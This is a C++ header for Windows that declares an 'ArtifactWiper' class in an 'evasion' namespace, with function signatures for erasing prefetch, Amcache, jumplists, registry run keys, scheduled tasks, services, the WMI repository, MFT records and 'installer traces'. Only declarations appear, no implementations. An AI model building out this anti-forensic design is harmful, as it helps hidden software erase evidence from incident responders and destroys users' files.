#pragma once
#include <windows.h>
#include <string>
#include <vector>

namespace l4g::evasion {

class ArtifactWiper {
public:
    // Wipe installation artifacts
    static bool wipe_prefetch(const wchar_t* exe_name);
    static bool wipe_amcache(const wchar_t* exe_name);
    static bool wipe_recent_files();
    static bool wipe_jumplists();
    static bool wipe_temp_files();
    static bool wipe_downloads();
    static bool wipe_recycle_bin();
    static bool wipe_registry_run_keys();
    static bool wipe_scheduled_tasks();
    static bool wipe_service_entries();
    static bool wipe_wmi_repository();
    static bool wipe_all_artifacts();
    
    // Specific to our installer
    static bool wipe_installer_traces(const wchar_t* install_path);
    
private:
    static bool delete_file_secure(const wchar_t* path);
    static bool wipe_free_space(const wchar_t* drive);
    static bool clean_mft_record(const wchar_t* path);
};

} // namespace l4g::evasion